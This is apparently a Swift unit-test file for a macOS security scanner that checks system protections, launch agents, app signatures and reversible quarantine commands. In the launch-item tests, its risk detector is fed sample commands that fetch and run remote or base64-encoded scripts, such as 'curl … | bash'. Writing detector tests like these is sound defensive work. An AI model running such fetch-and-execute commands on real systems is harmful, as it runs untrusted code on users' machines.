import XCTest
@testable import DogMonitor

/// 보안 점검 rules with fixtures: command outputs, plists in a temp folder, a fake signature checker and a fake runner.
final class SecurityTests: XCTestCase {
    private var tmp: URL!
    private let day: TimeInterval = 86_400
    private let now = Date(timeIntervalSince1970: 1_790_000_000)

    override func setUpWithError() throws {
        tmp = FileManager.default.temporaryDirectory.appendingPathComponent("security-tests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws { try? FileManager.default.removeItem(at: tmp) }

    // MARK: Parsing

    func testParsesCommandOutputs() {
        let v = SecurityParse.xprotectVersion("Version: 5362 Installed: 2026-09-26 13:26:51 +0000\n")
        XCTAssertEqual(v?.version, "5362")
        XCTAssertEqual(v?.installed, ISO8601DateFormatter().date(from: "2026-09-26T13:26:51Z"))
        XCTAssertNil(SecurityParse.xprotectVersion(""))
        let s = SecurityParse.xprotectScans("XProtect launch scans: enabled\nXProtect background scans: disabled\n")
        XCTAssertEqual(s.launch, true)
        XCTAssertEqual(s.background, false)

        XCTAssertEqual(SecurityParse.onOff("assessments enabled\n", on: "assessments enabled", off: "assessments disabled"), true)
        XCTAssertEqual(SecurityParse.onOff("assessments disabled\n", on: "assessments enabled", off: "assessments disabled"), false)
        XCTAssertEqual(SecurityParse.onOff("System Integrity Protection status: enabled.", on: "status: enabled", off: "status: disabled"), true)
        XCTAssertEqual(SecurityParse.onOff("FileVault is Off.", on: "FileVault is On", off: "FileVault is Off"), false)
        XCTAssertNil(SecurityParse.onOff("", on: "a", off: "b"))
        XCTAssertEqual(SecurityParse.firewall("Firewall is disabled. (State = 0)"), false)
        XCTAssertEqual(SecurityParse.firewall("Firewall is enabled. (State = 1)"), true)
        XCTAssertEqual(SecurityParse.firewall("Firewall is blocking all non-essential incoming connections. (State = 2)"), true)
        XCTAssertEqual(SecurityParse.screenLock("2026-09-30 12:25:34.271 sysadminctl[1:2] screenLock delay is immediate"), 0)
        XCTAssertEqual(SecurityParse.screenLock("screenLock delay is 300 seconds"), 300)
        XCTAssertEqual(SecurityParse.screenLock("screenLock is off"), -1)
        XCTAssertNil(SecurityParse.screenLock("not allowed"))
    }

    func testListeningPortsSkipLoopback() {
        let out = """
        Active Internet connections (including servers)
        Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)
        tcp4       0      0  *.22                   *.*                    LISTEN
        tcp6       0      0  *.445                  *.*                    LISTEN
        tcp4       0      0  127.0.0.1.5900         *.*                    LISTEN
        tcp6       0      0  ::1.8080               *.*                    LISTEN
        tcp4       0      0  192.168.0.2.51000      17.1.2.3.443           ESTABLISHED
        tcp46      0      0  *.7000                 *.*                    LISTEN
        """
        XCTAssertEqual(SecurityParse.listeningPorts(out), [22, 445, 7000])
    }

    func testProxies() {
        let none = """
        <dictionary> {
          ExceptionsList : <array> {
            0 : *.local
            1 : 169.254/16
          }
          FTPPassive : 1
        }
        """
        XCTAssertEqual(SecurityParse.proxies(none), [])
        let set = """
        <dictionary> {
          HTTPEnable : 1
          HTTPPort : 8080
          HTTPProxy : 10.0.0.5
          HTTPSEnable : 0
          ProxyAutoConfigEnable : 1
          ProxyAutoConfigURLString : http://wpad.example/proxy.pac
        }
        """
        XCTAssertEqual(SecurityParse.proxies(set), ["HTTP 프록시 10.0.0.5:8080", "자동 프록시(PAC) http://wpad.example/proxy.pac"])
    }

    func testLogFilterKeepsDetectionsOnly() {
        let log = """
        Timestamp               Ty Process[PID:TID]
        2026-09-30 11:35:31.815 Df syspolicyd[461:15753e1] [com.apple.xprotect:xprotect] Forwarding detection succeeded!
        2026-09-30 11:35:42.372 Df osascript[730:1575655] [com.apple.xprotect:xprotect] Using XProtect rules location: /var/protected/xprotect/XProtect.bundle/Contents/Resources/XPScripts.yr
        2026-09-29 03:00:01.000 Df XProtectRemediatorAdload[900:1a] [com.apple.XProtectFramework:Runner] Scanner [com.apple.XProtectFramework.plugins.Adload] - Status: NoThreatDetected
        2026-09-28 14:02:10.100 Df XProtectRemediatorAdload[901:1b] [com.apple.XProtectFramework:Runner] Scanner [com.apple.XProtectFramework.plugins.Adload] - Status: ThreatDetected, remediated
        2026-09-28 14:02:11.100 Df XProtectRemediatorAdload[901:1c] [com.apple.XProtectFramework:Runner] Scanner [com.apple.XProtectFramework.plugins.Adload] - Status: ThreatDetected, remediated
        2026-09-27 09:00:00.000 Df XprotectService[88:2] [com.apple.xprotect:xprotect] Malware blocked: com.bad.app
        """
        let lines = SecurityParse.detections(log)
        XCTAssertEqual(lines.count, 2, "\(lines)")   // the repeat is dropped
        XCTAssertTrue(lines[0].hasPrefix("09-28 14:02 XProtectRemediatorAdload: Scanner"), lines[0])
        XCTAssertTrue(lines[1].contains("Malware blocked"))
        XCTAssertEqual(SecurityParse.detections(""), [])
    }

    // MARK: Protections

    /// What this Mac reported when the feature was built.
    private var measured: ProtectionFacts {
        ProtectionFacts(xprotectVersion: "5362", xprotectInstalled: now.addingTimeInterval(-4 * day), launchScans: true, backgroundScans: true,
                        gatekeeper: true, sip: true, fileVault: true, firewall: false, autoMacOS: true, configData: true, critical: true,
                        autoLoginUser: nil, screenLockDelay: 0, listeningPorts: [5000, 7000], proxies: [])
    }

    private func level(_ rows: [ProtectionRow], _ id: String) -> SecurityLevel? { rows.first { $0.id == id }?.level }

    func testMeasuredMacOnlyWarnsAboutFirewall() {
        let rows = ProtectionRules.rows(measured, now: now)
        XCTAssertEqual(rows.filter { $0.level != .ok }.map(\.id), ["firewall"])
        XCTAssertEqual(rows.first { $0.id == "firewall" }?.pane, SettingsPane.firewall)
        let report = SecurityReport(protections: rows, launchItems: [], apps: [], detections: [], scannedAt: now, seconds: 1)
        XCTAssertFalse(report.needsAttention, "firewall off alone is not a key protection")
        XCTAssertEqual(report.worst, .warn)
    }

    func testProtectionRules() {
        var f = measured
        f.xprotectInstalled = now.addingTimeInterval(-45 * day)
        XCTAssertEqual(level(ProtectionRules.rows(f, now: now), "xprotect"), .warn)
        f.backgroundScans = false
        XCTAssertEqual(level(ProtectionRules.rows(f, now: now), "xprotect"), .danger)
        XCTAssertEqual(level(ProtectionRules.rows(ProtectionFacts(), now: now), "xprotect"), .warn)   // unreadable

        f = measured
        f.gatekeeper = false; f.sip = false; f.fileVault = false; f.autoLoginUser = "jelly"
        let rows = ProtectionRules.rows(f, now: now)
        XCTAssertEqual(level(rows, "gatekeeper"), .danger)
        XCTAssertEqual(level(rows, "sip"), .danger)
        XCTAssertNil(rows.first { $0.id == "sip" }?.button, "SIP only changes from recovery mode")
        XCTAssertEqual(level(rows, "filevault"), .warn)
        XCTAssertEqual(level(rows, "autologin"), .danger)
        XCTAssertTrue(SecurityReport(protections: rows, launchItems: [], apps: [], detections: nil, scannedAt: now, seconds: 1).needsAttention)

        f = measured
        f.autoMacOS = nil
        XCTAssertEqual(level(ProtectionRules.rows(f, now: now), "updates"), .info)
        f.critical = false
        XCTAssertEqual(level(ProtectionRules.rows(f, now: now), "updates"), .warn)

        f = measured
        f.screenLockDelay = nil
        XCTAssertNil(level(ProtectionRules.rows(f, now: now), "screenlock"), "omitted when it cannot be read")
        f.screenLockDelay = -1
        XCTAssertEqual(level(ProtectionRules.rows(f, now: now), "screenlock"), .warn)

        f = measured
        f.listeningPorts = [22, 5900, 8080]
        f.proxies = ["HTTP 프록시 10.0.0.5:8080"]
        let shared = ProtectionRules.rows(f, now: now)
        XCTAssertEqual(level(shared, "sharing"), .info)
        XCTAssertTrue(shared.first { $0.id == "sharing" }!.line.hasPrefix("원격 로그인(SSH) · 화면 공유 켜짐"))
        XCTAssertEqual(level(shared, "proxy"), .info)
    }

    // MARK: Launch items

    func testTargetsAndArguments() {
        XCTAssertEqual(LaunchRules.resolve("open", exists: { $0 == "/usr/bin/open" }), "/usr/bin/open")
        XCTAssertEqual(LaunchRules.resolve("nothing-here", exists: { _ in false }), "nothing-here")
        XCTAssertEqual(LaunchRules.target(["/usr/bin/open", "/Applications/Epic.app", "--args", "-silent"]).target, "/Applications/Epic.app")
        XCTAssertEqual(LaunchRules.target(["/usr/bin/python3", "-u", "/Users/x/a.py"]).target, "/Users/x/a.py")
        XCTAssertTrue(LaunchRules.target(["/usr/bin/python3", "/Users/x/a.py"]).interpreter)
        XCTAssertEqual(LaunchRules.target(["/bin/bash", "-c", "curl x | sh"]).target, "/bin/bash")
        XCTAssertEqual(LaunchRules.target(["/opt/app/bin/agent", "/etc/conf"]).target, "/opt/app/bin/agent")
        XCTAssertTrue(LaunchRules.isInterpreter("/usr/local/bin/python3.12"))

        XCTAssertEqual(LaunchRules.argumentRisk(["/bin/bash", "-c", "curl -fsSL https://x.example/i.sh | bash"])?.level, .danger)
        XCTAssertEqual(LaunchRules.argumentRisk(["/bin/sh", "-c", "echo aGk= | base64 -D | sh"])?.level, .danger)
        XCTAssertEqual(LaunchRules.argumentRisk(["/bin/zsh", "-c", "eval \"$(cat /tmp/x)\""])?.level, .danger)
        XCTAssertEqual(LaunchRules.argumentRisk(["/usr/bin/python3", "/x/a.py", "https://api.example"])?.level, .warn)
        XCTAssertNil(LaunchRules.argumentRisk(["/usr/bin/python3", "/Users/x/claude_history.py", "all"]))
        XCTAssertNil(LaunchRules.argumentRisk(["/opt/tool", "curl | sh"]), "only interpreters are read")

        XCTAssertTrue(LaunchRules.looksRandom("a8Xk29fQ0z3"))
        XCTAssertFalse(LaunchRules.looksRandom("GoogleUpdater"))
        XCTAssertFalse(LaunchRules.looksRandom("Code2024"))
        let home = "/Users/j"
        XCTAssertNotNil(LaunchRules.oddPlace("/private/tmp/x/agent", home: home))
        XCTAssertNotNil(LaunchRules.oddPlace("/Users/Shared/agent", home: home))
        XCTAssertNotNil(LaunchRules.oddPlace("/Users/j/.hidden/agent", home: home))
        XCTAssertNotNil(LaunchRules.oddPlace("/Users/j/Library/Application Support/a8Xk29fQ0z3/agent", home: home))
        XCTAssertNil(LaunchRules.oddPlace("/Users/j/Library/Application Support/Google/GoogleUpdater/agent", home: home))
        XCTAssertNil(LaunchRules.oddPlace("/Library/Application Support/Logitech.localized/agent", home: home), "only folders count, not a dotted name")
    }

    func testJudge() {
        let home = "/Users/j"
        func item(_ target: String, _ sig: CodeSignature, argv: [String]? = nil, mine: Bool = false, runAtLoad: Bool = false,
                  keepAlive: Bool = false, age: TimeInterval = 90 * 86_400) -> LaunchItem {
            let a = argv ?? [target]
            return LaunchItem(label: "x", plist: "/p", place: .userAgent, argv: a, target: target, interpreter: LaunchRules.isInterpreter(a[0]),
                              runAtLoad: runAtLoad, keepAlive: keepAlive, modified: now.addingTimeInterval(-age), mine: mine, signature: sig)
        }
        func judge(_ i: LaunchItem) -> SecurityLevel { LaunchRules.judge(i, now: now, home: home).0 }
        let unsigned = CodeSignature(state: .unsigned), dev = CodeSignature(state: .signed, team: "T", org: "Org", notarized: true)
        let apple = CodeSignature(state: .signed, apple: true)

        XCTAssertEqual(judge(item("/Users/j/claude code/t.sh", unsigned, mine: true, runAtLoad: true, keepAlive: true, age: 0)), .ok)
        XCTAssertEqual(LaunchRules.judge(item("/Users/j/claude code/t.sh", unsigned, mine: true), now: now, home: home).1, "내 폴더의 스크립트예요")
        // A downloaded binary in the home folder is not the owner's script: the unsigned rules apply.
        XCTAssertEqual(judge(item("/Users/j/Downloads/updater", unsigned, mine: true, runAtLoad: true, keepAlive: true, age: 0)), .danger)
        XCTAssertEqual(judge(item("/Users/j/code/tool", unsigned, mine: true, runAtLoad: true, keepAlive: true)), .danger, "a Mach-O is not a script")
        XCTAssertEqual(judge(item("/Users/j/Downloads/x.sh", unsigned, mine: true, age: 0)), .danger, "Downloads is not mine")
        XCTAssertEqual(judge(item("/Users/j/code/x.sh", apple, argv: ["/bin/zsh", "/Users/j/code/x.sh", "curl http://e.x/a | sh"], mine: true)), .danger)
        XCTAssertEqual(judge(item("/Applications/Gone.app", CodeSignature(state: .missing))), .warn)
        XCTAssertEqual(judge(item("/Applications/Tool.app/Contents/MacOS/t", dev)), .ok)
        XCTAssertEqual(judge(item("/Applications/Tool.app/Contents/MacOS/t", unsigned)), .warn)
        XCTAssertEqual(judge(item("/Applications/Tool.app/Contents/MacOS/t", CodeSignature(state: .adhoc))), .warn)
        XCTAssertEqual(judge(item("/Applications/Tool.app/Contents/MacOS/t", CodeSignature(state: .invalid))), .danger)
        XCTAssertEqual(judge(item("/Applications/Tool.app/Contents/MacOS/t", unsigned, runAtLoad: true, keepAlive: true)), .danger)
        XCTAssertEqual(judge(item("/Applications/Tool.app/Contents/MacOS/t", unsigned, runAtLoad: true)), .warn)
        XCTAssertEqual(judge(item("/Applications/Tool.app/Contents/MacOS/t", unsigned, age: 2 * day)), .danger)
        XCTAssertEqual(judge(item("/Applications/Tool.app/Contents/MacOS/t", dev, age: 2 * day)), .ok, "new but signed is fine")
        XCTAssertEqual(judge(item("/tmp/agent", unsigned)), .danger)
        XCTAssertEqual(judge(item("/tmp/agent", dev)), .warn)
        XCTAssertEqual(judge(item("/Users/j/.cache/agent", unsigned)), .danger)
        XCTAssertEqual(judge(item("/bin/bash", apple, argv: ["/bin/bash", "-c", "curl -s http://x | sh"])), .danger)
        XCTAssertEqual(judge(item("/usr/bin/python3", apple, argv: ["/usr/bin/python3", "-c", "print(1)"])), .ok)
        let script = item("/Library/Scripts/a.sh", unsigned, argv: ["/bin/bash", "/Library/Scripts/a.sh"])
        XCTAssertEqual(judge(script), .warn)
        XCTAssertEqual(script.signer, "스크립트")
    }

    private func writePlist(_ dir: URL, _ name: String, _ dict: [String: Any], age: TimeInterval = 90 * 86_400) throws {
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let url = dir.appendingPathComponent(name)
        try PropertyListSerialization.data(fromPropertyList: dict, format: .xml, options: 0).write(to: url)
        try FileManager.default.setAttributes([.modificationDate: Date().addingTimeInterval(-age)], ofItemAtPath: url.path)
    }

    func testLaunchItemsFromFolders() throws {
        let home = tmp.path
        let user = tmp.appendingPathComponent("Library/LaunchAgents"), system = tmp.appendingPathComponent("LaunchDaemons")
        try writePlist(user, "com.apple.x.plist", ["Label": "com.apple.x", "Program": "/usr/libexec/x"])
        try writePlist(system, "com.apple.softwareupdated.plist", ["Label": "com.apple.softwareupdated", "Program": "/Library/Vendor/fake"])
        try writePlist(user, "com.jelly.dogmonitor.plist", ["Label": "com.jelly.dogmonitor", "Program": "/Applications/J.app/Contents/MacOS/J"])
        try writePlist(user, "empty.plist", [:])
        try writePlist(user, "com.mine.backup.plist", ["Label": "com.mine.backup", "ProgramArguments": ["/usr/bin/python3", home + "/code/b.py"]])
        try writePlist(user, "com.bad.tmp.plist", ["Label": "com.bad.tmp", "Program": "/private/tmp/.x/run", "RunAtLoad": true, "KeepAlive": true])
        try writePlist(user, "com.gone.plist", ["Label": "com.gone", "ProgramArguments": ["open", "/Applications/Gone.app"]])
        try writePlist(user.appendingPathComponent(LaunchAgents.parkedName), "com.old.plist", ["Label": "com.old", "Program": "/opt/old"])
        try writePlist(system, "com.vendor.daemon.plist", ["Label": "com.vendor.daemon", "Program": "/Library/Vendor/d", "KeepAlive": ["SuccessfulExit": false]])
        try "not a plist".write(to: user.appendingPathComponent("junk.plist"), atomically: true, encoding: .utf8)

        let sign: SignatureChecker = { path in
            switch path {
            case "/Applications/Gone.app": return CodeSignature(state: .missing)
            case "/usr/libexec/x": return CodeSignature(state: .signed, apple: true)
            case "/Library/Vendor/d": return CodeSignature(state: .signed, team: "V", org: "Vendor", notarized: true)
            default: return CodeSignature(state: .unsigned)
            }
        }
        let dirs = SecurityScanner.launchDirs(home: home).filter { $0.dir.hasPrefix(home) } + [(system.path, LaunchItem.Place.daemon, false)]
        let items = SecurityScanner.launchItems(dirs: dirs, sign: sign, home: home, own: "com.jelly.dogmonitor", now: Date())
        let byLabel = Dictionary(uniqueKeysWithValues: items.map { ($0.label, $0) })
        XCTAssertEqual(Set(byLabel.keys), ["com.mine.backup", "com.bad.tmp", "com.gone", "com.old", "com.vendor.daemon",
                                               "com.apple.softwareupdated"], "a com.apple name is hidden only when Apple signed it")
        XCTAssertEqual(byLabel["com.apple.softwareupdated"]?.level, .warn)
        XCTAssertEqual(byLabel["com.apple.softwareupdated"]?.reason.hasPrefix("Apple 이름을 쓰지만 Apple 서명이 아니에요"), true)
        XCTAssertEqual(items.first?.label, "com.bad.tmp", "위험 first")
        XCTAssertEqual(byLabel["com.bad.tmp"]?.level, .danger)
        XCTAssertEqual(byLabel["com.mine.backup"]?.level, .ok)
        XCTAssertEqual(byLabel["com.mine.backup"]?.mine, true)
        XCTAssertEqual(byLabel["com.gone"]?.argv.first, "/usr/bin/open")
        XCTAssertEqual(byLabel["com.gone"]?.level, .warn)
        XCTAssertEqual(byLabel["com.old"]?.parked, true)
        XCTAssertEqual(items.last?.label, "com.old", "parked items last")
        XCTAssertEqual(byLabel["com.vendor.daemon"]?.level, .ok)
        XCTAssertEqual(byLabel["com.vendor.daemon"]?.keepAlive, true)
        XCTAssertEqual(byLabel["com.vendor.daemon"]?.place, .daemon)
    }

    // MARK: Apps

    func testAppsOneFolderDeep() throws {
        func app(_ rel: String, id: String) throws {
            let c = tmp.appendingPathComponent(rel + "/Contents")
            try FileManager.default.createDirectory(at: c, withIntermediateDirectories: true)
            try PropertyListSerialization.data(fromPropertyList: ["CFBundleIdentifier": id], format: .xml, options: 0)
                .write(to: c.appendingPathComponent("Info.plist"))
        }
        try app("Apps/Good.app", id: "com.good")
        try app("Apps/Bad.app", id: "com.bad")
        try app("Apps/Jelly.app", id: "com.jelly.dogmonitor")
        try app("Apps/Tools/Deep.app", id: "com.deep")
        try app("Apps/Tools/Sub/TooDeep.app", id: "com.toodeep")
        try app("Apps/Dev.app", id: "com.dev")
        let sign: SignatureChecker = { path in
            switch (path as NSString).lastPathComponent {
            case "Good.app": return CodeSignature(state: .signed, team: "G", notarized: true)
            case "Dev.app": return CodeSignature(state: .signed, team: "D")
            case "Deep.app": return CodeSignature(state: .invalid)
            default: return CodeSignature(state: .unsigned)
            }
        }
        let found = SecurityScanner.apps(roots: [tmp.appendingPathComponent("Apps").path, tmp.appendingPathComponent("none").path],
                                         sign: sign, own: "com.jelly.dogmonitor")
        XCTAssertEqual(found.map(\.name), ["Bad", "Deep", "Dev"])
        XCTAssertEqual(found.map(\.level), [.warn, .warn, .info])
        XCTAssertNil(AppRules.judge(CodeSignature(state: .signed, appStore: true)))
        XCTAssertNil(AppRules.judge(CodeSignature(state: .signed, apple: true)))
    }

    // MARK: Actions

    func testAdminCommands() {
        var i = LaunchItem(label: "com.vendor.d", plist: "/Library/LaunchDaemons/com.vendor.d.plist", place: .daemon,
                           argv: ["/x"], target: "/x", interpreter: false)
        let off = AdminCommand.disable(i, uid: 501, own: "com.jelly.dogmonitor")
        XCTAssertEqual(off, "/bin/mkdir -p '/Library/Application Support/JellyMonitor/격리된 항목/LaunchDaemons'"
            + " && /bin/test ! -e '/Library/Application Support/JellyMonitor/격리된 항목/LaunchDaemons/com.vendor.d.plist'"
            + " && { /bin/launchctl bootout 'system/com.vendor.d' || true; }"
            + " && /bin/mv '/Library/LaunchDaemons/com.vendor.d.plist' '/Library/Application Support/JellyMonitor/격리된 항목/LaunchDaemons/com.vendor.d.plist'")
        XCTAssertFalse(off!.contains("rm "), "never deletes")

        var agent = i
        agent.place = .agent
        agent.plist = "/Library/LaunchAgents/it's.plist"
        XCTAssertTrue(AdminCommand.disable(agent, uid: 501, own: "x")!.contains("'gui/501/com.vendor.d'"))
        XCTAssertTrue(AdminCommand.disable(agent, uid: 501, own: "x")!.contains(#"'/Library/LaunchAgents/it'\''s.plist'"#))

        i.label = "com.apple.bad"
        XCTAssertNil(AdminCommand.disable(i, uid: 501, own: "x"))
        i.label = "com.jelly.dogmonitor.helper"
        XCTAssertNil(AdminCommand.disable(i, uid: 501, own: "com.jelly.dogmonitor"))
        i.label = "com.vendor.d"
        i.plist = "/Library/LaunchDaemons/sub/com.vendor.d.plist"
        XCTAssertNil(AdminCommand.disable(i, uid: 501, own: "x"), "only directly in the launchd folder")
        i.place = .userAgent
        XCTAssertNil(AdminCommand.disable(i, uid: 501, own: "x"), "user agents use the cleaner's 끄기")

        let parked = LaunchItem(label: "com.vendor.d", plist: AdminCommand.quarantine + "/LaunchDaemons/com.vendor.d.plist", place: .daemon,
                                argv: ["/x"], target: "/x", interpreter: false, parked: true)
        XCTAssertEqual(AdminCommand.enable(parked, uid: 501),
                       "/bin/test ! -e '/Library/LaunchDaemons/com.vendor.d.plist' && /bin/mv '\(AdminCommand.quarantine)/LaunchDaemons/com.vendor.d.plist'"
                       + " '/Library/LaunchDaemons/com.vendor.d.plist' && { /bin/launchctl bootstrap system '/Library/LaunchDaemons/com.vendor.d.plist' || true; }")
        XCTAssertNil(AdminCommand.disable(parked, uid: 501, own: "x"))

        XCTAssertEqual(AdminCommand.appleScript(#"/bin/echo "a\b""#), #"do shell script "/bin/echo \"a\\b\"" with administrator privileges"#)
    }

    /// 끄기 then 다시 켜기 of a user agent through the cleaner's reversible park, with a fake launchctl.
    func testUserToggleIsReversible() throws {
        let dir = tmp.appendingPathComponent("LaunchAgents")
        try writePlist(dir, "com.bad.agent.plist", ["Label": "com.bad.agent", "Program": "/tmp/agent"])
        var calls: [[String]] = []
        let run: CommandRunner = { argv in
            calls.append(argv)
            return argv == ["/bin/launchctl", "list"] ? (0, "PID\tStatus\tLabel\n-\t0\tcom.bad.agent\n") : (0, "")
        }
        let items = SecurityScanner.launchItems(dirs: [(dir.path, .userAgent, false), (dir.path + "/" + LaunchAgents.parkedName, .userAgent, true)],
                                                sign: { _ in CodeSignature(state: .unsigned) }, home: tmp.path, own: "own")
        XCTAssertNil(SecurityActions.toggleUser(items[0], dir: dir.path, run: run))
        XCTAssertTrue(calls.contains { $0.first == "/bin/launchctl" && $0.dropFirst().first == "bootout" })
        let parkedPath = dir.path + "/" + LaunchAgents.parkedName + "/com.bad.agent.plist"
        XCTAssertTrue(FileManager.default.fileExists(atPath: parkedPath))

        let after = SecurityScanner.launchItems(dirs: [(dir.path, .userAgent, false), (dir.path + "/" + LaunchAgents.parkedName, .userAgent, true)],
                                                sign: { _ in CodeSignature(state: .unsigned) }, home: tmp.path, own: "own")
        XCTAssertEqual(after.map(\.parked), [true])
        XCTAssertNil(SecurityActions.toggleUser(after[0], dir: dir.path, run: run))
        XCTAssertTrue(FileManager.default.fileExists(atPath: dir.path + "/com.bad.agent.plist"))

        var apple = after[0]
        apple.label = "com.apple.thing"
        XCTAssertNotNil(SecurityActions.toggleUser(apple, dir: dir.path, run: run))
    }

    // MARK: Probes

    func testFactsFromFakeCommands() {
        let outputs: [String: String] = [
            "/usr/bin/xprotect version": "Version: 5362 Installed: 2026-09-26 13:26:51 +0000",
            "/usr/bin/xprotect status": "XProtect launch scans: enabled\nXProtect background scans: enabled",
            "/usr/sbin/spctl --status": "assessments enabled",
            "/usr/bin/csrutil status": "System Integrity Protection status: enabled.",
            "/usr/bin/fdesetup status": "FileVault is On.",
            "/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate": "Firewall is disabled. (State = 0)",
            "/bin/sh -c /usr/sbin/sysadminctl -screenLock status 2>&1": "screenLock delay is immediate",
            "/usr/sbin/netstat -an -p tcp": "tcp4 0 0 *.22 *.* LISTEN",
            "/usr/sbin/scutil --proxy": "<dictionary> {\n}",
        ]
        var ran: [String] = []
        let run: CommandRunner = { argv in
            let key = argv.joined(separator: " ")
            ran.append(key)
            return (0, outputs[key] ?? "")
        }
        let plists: [String: [String: Any]] = [
            "/Library/Preferences/com.apple.SoftwareUpdate.plist": ["AutomaticallyInstallMacOSUpdates": true, "ConfigDataInstall": true],
            "/Library/Preferences/com.apple.loginwindow.plist": ["autoLoginUser": "guest"],
        ]
        let f = SecurityScanner.facts(run: run, readPlist: { plists[$0] })
        XCTAssertEqual(Set(ran), Set(outputs.keys), "only these read-only commands")
        XCTAssertEqual(f.xprotectVersion, "5362")
        XCTAssertEqual(f.firewall, false)
        XCTAssertEqual(f.fileVault, true)
        XCTAssertEqual(f.autoMacOS, true)
        XCTAssertNil(f.critical)
        XCTAssertEqual(f.autoLoginUser, "guest")
        XCTAssertEqual(f.screenLockDelay, 0)
        XCTAssertEqual(f.listeningPorts, [22])

        XCTAssertNil(SecurityScanner.detections(run: { _ in (-1, "") }), "a log that timed out hides the section")
        XCTAssertEqual(SecurityScanner.detections(run: { argv in
            XCTAssertEqual(argv.first, "/usr/bin/log")
            XCTAssertTrue(argv.contains("7d"))
            return (0, "")
        }), [])
    }

    /// The real checker on files that exist on every Mac. Read-only.
    func testRealSignatureChecker() {
        let ls = CodeSigning.check("/bin/ls")
        XCTAssertEqual(ls.state, .signed)
        XCTAssertTrue(ls.apple)
        XCTAssertEqual(CodeSigning.check(tmp.path + "/nothing").state, .missing)
        let script = tmp.appendingPathComponent("s.sh")
        try? "#!/bin/sh\necho hi\n".write(to: script, atomically: true, encoding: .utf8)
        XCTAssertEqual(CodeSigning.check(script.path).state, .unsigned)
        XCTAssertEqual(CodeSignature.org(fromSubject: "Developer ID Application: Logitech Inc. (QED4VVPZWA)"), "Logitech Inc.")
    }
}
